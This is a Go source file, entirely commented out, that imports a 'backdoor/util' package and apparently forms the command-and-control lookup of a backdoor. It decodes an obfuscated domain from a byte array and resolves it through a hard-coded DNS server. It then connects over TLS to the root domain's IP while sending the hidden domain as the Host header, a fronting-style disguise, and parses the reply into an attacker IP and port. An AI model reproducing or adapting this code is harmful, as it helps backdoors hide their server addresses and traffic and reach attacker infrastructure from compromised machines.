package main

// import (
// 	"backdoor/util"
// 	"context"
// 	"crypto/tls"
// 	"fmt"
// 	"net"
// 	"strconv"
// 	"strings"
// 	"time"
// )

// func getDomain() (string, error) {
// 	var data = []byte{0xab, 0xe, 0x64, 0xb9, 0x66, 0x4, 0x9f, 0xea, 0x95, 0x94, 0x7d, 0x88, 0x6f, 0xf, 0xae, 0x7d, 0x4d, 0x14, 0xf, 0x73, 0x1f, 0x23, 0xc3, 0xd6, 0x93, 0x92, 0x3e, 0xa7, 0x38, 0xa1, 0xe2, 0x3c}
// 	pdecoder := util.NewDecoder()
// 	urlBytes, err := pdecoder.Decode(data)
// 	return string(urlBytes), err
// }

// var CustomResolver = &net.Resolver{
// 	PreferGo: true,
// 	Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
// 		d := &net.Dialer{}
// 		return d.DialContext(ctx, network, "8.8.8.8:53")
// 	},
// }

// var DefaultResolver = &net.Resolver{}

// func lookupIP(ctx context.Context, resolv *net.Resolver, host string) ([]net.IP, error) {
// 	addrs, err := resolv.LookupIPAddr(ctx, host)
// 	if err != nil {
// 		return nil, err
// 	}
// 	ips := make([]net.IP, 0)
// 	for _, ia := range addrs {
// 		if ia.IP == nil || ia.IP.To4() == nil {
// 			continue
// 		}
// 		ips = append(ips, ia.IP)
// 	}
// 	if len(ips) == 0 {
// 		return nil, fmt.Errorf("%d", len(ips))
// 	}
// 	return ips, nil
// }

// func getIP() (string, error) {
// 	realDomain, err := getDomain()
// 	if err != nil {
// 		return "", err
// 	}
// 	var rootDomain string
// 	if index := strings.Index(realDomain, "."); index != -1 {
// 		rootDomain = realDomain[index+1:]
// 	}
// 	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
// 	defer cancel()
// 	ips, err := lookupIP(ctx, CustomResolver, rootDomain)
// 	if err != nil {
// 		ips, err = lookupIP(ctx, DefaultResolver, rootDomain)
// 	}
// 	if len(ips) == 0 {
// 		return "", err
// 	}
// 	conf := tls.Config{
// 		ServerName: rootDomain,
// 	}
// 	pdial := new(net.Dialer)
// 	pdial.Timeout = 24 * time.Second
// 	conn, err := tls.DialWithDialer(pdial, "tcp", fmt.Sprintf("%s:443", ips[0].String()), &conf)
// 	if err != nil {
// 		return "", err
// 	}
// 	defer conn.Close()
// 	conn.Write([]byte(fmt.Sprintf("GET / HTTP/1.1\r\nHost:%s\r\n\r\n", realDomain)))
// 	conn.SetReadDeadline(time.Now().Add(20 * time.Second))
// 	buffer := make([]byte, 102400)
// 	nread := 0
// 	for {
// 		if nread == len(buffer) {
// 			break
// 		}
// 		n, err := conn.Read(buffer[nread:])
// 		nread += n
// 		if err != nil {
// 			break
// 		}
// 	}
// 	strRsp := string(buffer[0:nread])
// 	index := strings.Index(strRsp, "\r\n\r\n")
// 	if index == -1 {
// 		return "", fmt.Errorf("err")
// 	}
// 	rspText := strings.TrimSpace(strRsp[index+4:])
// 	strArr := strings.Split(rspText, ":")
// 	if len(strArr) < 2 {
// 		return "", fmt.Errorf("%s", rspText)
// 	}
// 	ip := net.ParseIP(strArr[0])
// 	if ip == nil || ip.To4() == nil {
// 		return "", fmt.Errorf("%s", rspText)
// 	}
// 	port, err := strconv.ParseUint(strArr[1], 10, 16)
// 	if err != nil {
// 		return "", err
// 	}
// 	if port == 0 {
// 		return "", fmt.Errorf("%s", rspText)
// 	}
// 	return fmt.Sprintf("%s:%d", ip.String(), port), nil
// }
